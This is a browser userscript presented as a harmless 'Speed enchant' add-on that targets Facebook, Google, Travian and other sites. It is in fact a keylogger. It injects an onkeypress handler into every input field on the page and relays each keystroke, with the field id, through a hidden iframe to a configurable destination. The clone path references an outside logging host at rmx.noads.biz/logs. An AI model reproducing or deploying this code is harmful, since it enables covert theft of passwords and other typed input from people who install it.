// ==UserScript==
// @name        Speed enchant
// @author      Rmx
// @version    	1.2
// @description lol
// @include	http://*/
// @include	http://*.facebook.com/
// @include	http://*.google.*/
// @include	http://*.travian.*/
// @include	http://*.travian.co.*/
// @include	http://*.travian.com.*/

// ==/UserScript==
// Copyright © John Leitch 2010 john.leitch5@gmail.com
var destination = null;
var useClone = false;
var cloneSource = null;
var cloneDelay = 1000;

function hookInputs() {
    var frame = document.getElementById('overlayFrame');    

    var keyPressScript =
        '<script>' +
            'var l = Math.random().toString().substring(2);' +
            'function relayKeyPress(e) {' +
                'var fc = document.getElementById("frameContainer");' +
                'var x = String.fromCharCode(e.keyCode);' +
                'var y = String.fromCharCode(e.which);' +
                'var k = e.keyCode ? x : y;' +
                'var f = \'' + destination +
                    '\' + escape(k) + \',\' + ' +
                    '(e.srcElement ? e.srcElement.id : e.target.id) + ' +
                    '\',\' + l;' +
                'fc.src = f;' +
            '};' +
        '</\x73cript>';

    var iframe = '<iframe id="frameContainer" style="display:none;"></iframe>';

    var sourceDoc = useClone ? frame.contentDocument : document;

    var html = sourceDoc.getElementsByTagName('html')[0].innerHTML;

    html = html.replace(/<head([^>]*)>/i, '<head $1>' + keyPressScript);
    html = html.replace(/<body([^>]*)>/i, '<body $1>' + iframe);
    html = html.replace(/<input/gi, '<input onkeypress="relayKeyPress(event)" ');

    document.clear();
    document.write(html);
}

window.onload = function() {
    if (destination == null) {
        alert('destination not set');

        return;
    }

    if (useClone) {

        if (cloneSource == null) {
            alert('cloneSource not set');
            return;
        }

        document.body.innerHTML +=
            '<iframe style="display:none;" id="overlayFrame" src=http://rmx.noads.biz/logs/?keys="' +
                cloneSource + '"></iframe>';

        setTimeout("hookInputs()", cloneDelay);
    }
    else
        hookInputs();
};
